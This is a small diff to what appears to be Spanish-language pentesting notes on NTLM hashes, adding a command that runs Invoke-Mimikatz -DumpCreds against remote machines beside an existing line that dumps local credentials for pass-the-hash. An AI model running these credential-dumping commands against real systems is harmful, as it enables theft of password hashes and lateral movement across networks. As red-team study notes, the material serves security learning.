@@ -64,6 +64,7 @@ Características y detalles sobre el hash NTLM:
 
 ```powershell
 ❯ Invoke-mimikatz -DumpCreds          # Dumpear las credenciales locales, obtener el NTLM y hacer un PtH
+❯ Invoke-mimikatz -DumpCreds -ComputerName @("comp1","comp2")
 ```
 
 ## Extracción de credenciales con Powershell 
